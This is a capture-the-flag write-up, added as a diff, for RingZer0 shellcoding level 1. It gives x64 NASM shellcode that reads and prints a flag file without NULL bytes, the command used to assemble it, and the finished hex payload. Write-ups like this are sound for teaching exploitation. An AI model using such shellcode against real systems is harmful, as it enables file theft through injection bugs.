@@ -1,0 +1,70 @@
+Level 1
+
+Let's start easy. Upon connecting via ssh, the challenge presents us with the following:
+
+$ ssh level1@shellcode.ringzer0team.com -p 7771
+level1@shellcode.ringzer0team.com's password:
+Linux ld64deb1 3.2.0-4-amd64 #1 SMP Debian 3.2.54-2 x86_64
+Last login: Sun Feb  1 19:36:20 2015 from 93.74.28.37
+
+RingZer0 Team CTF Shellcoding Level 1
+Submit your shellcode using hex representation "\xcc\xcd".
+Type "end" to exit.
+
+This level have no shellcode restriction.
+You main goal is to read /flag/level1.flag
+
+shellcode>
+
+Although it says no restriction, there is one crucial restriction: NULL bytes are not allowed. This probably means that the shellcode is being copied to a buffer by strcpy or something similar. I found this out the hard way... Anyway, after realizing my mistake, I rebuilt my shellcode from the ground up, avoiding all NULL bytes. The shellcode is quite simple: it builds the filename on the stack, then opens that file, reads the contents onto the stack and finally writes off the contents to stdout. A very helpful link is this x64 syscall table which lists all the syscalls and the arguments.
+
+To avoid NULL bytes, registers can be zeroed by using xor. To set a byte-sized value, the value can be pushed and then popped into a register. Often, registers still hold their original value after a syscall and thus can be re-used.
+
+bits 64
+
+_start:
+
+mov dword [rsp], '/fla'     ; build filename on stack
+mov dword [rsp+4], 'g/le'
+mov dword [rsp+8], 'vel1'
+mov dword [rsp+12], '.fla'
+push 'g'
+pop rcx
+mov [rsp+16], ecx
+
+lea rdi, [rsp]              ; rdi now points to filename '/flag/level1.flag'
+xor rsi, rsi                ; rsi contains O_RDONLY, the mode with which we'll open the file
+xor rax, rax
+inc rax
+inc rax                     ; syscall open = 2
+syscall
+
+mov rbx, rax                ; filehandle of opened file
+
+lea rsi, [rsp]              ; rsi is the buffer to which we'll read the file
+mov rdi, rbx                ; rbx was the filehandle
+push byte 0x7f              ; read 127 bytes. if we stay below this value, the generated opcode will not contain null bytes
+pop rdx
+xor rax, rax                ; syscall read = 0
+syscall
+
+lea rsi, [rsp]              ; the contents of the file were on the stack
+xor rdi, rdi
+inc rdi                     ; filehandle; stdout!
+mov rdx, rax                ; rax was amount of bytes read by syscall read
+xor rax, rax
+inc rax
+syscall                     ; syscall write = 1
+
+push byte 60                ; some bytes left...
+pop rax                     ; exit cleanly
+syscall
+
+To assemble and generate the shellcode in the format which the challenge wants, I used this command:
+
+$ echo; nasm -f bin ./level1-nonulls.asm; xxd -c 1 ./level1-nonulls | awk '{print "\\x"$2 }' |tr -d '\n'; echo; wc -c ./level1-nonulls
+
+\xc7\x04\x24\x2f\x66\x6c\x61\xc7\x44\x24\x04\x67\x2f\x6c\x65\xc7\x44\x24\x08\x76\x65\x6c\x31\xc7\x44\x24\x0c\x2e\x66\x6c\x61\x6a\x67\x59\x89\x4c\x24\x10\x48\x8d\x3c\x24\x48\x31\xf6\x48\x31\xc0\x48\xff\xc0\x48\xff\xc0\x0f\x05\x48\x89\xc3\x48\x8d\x34\x24\x48\x89\xdf\x6a\x7f\x5a\x48\x31\xc0\x0f\x05\x48\x8d\x34\x24\x48\x31\xff\x48\xff\xc7\x48\x89\xc2\x48\x31\xc0\x48\xff\xc0\x0f\x05\x6a\x3c\x58\x0f\x05
+100 ./level1-nonulls
+
+It spits out the shellcode, ready for copy & paste, along with the size of the shellcode. Running it versus the server yields the flag!
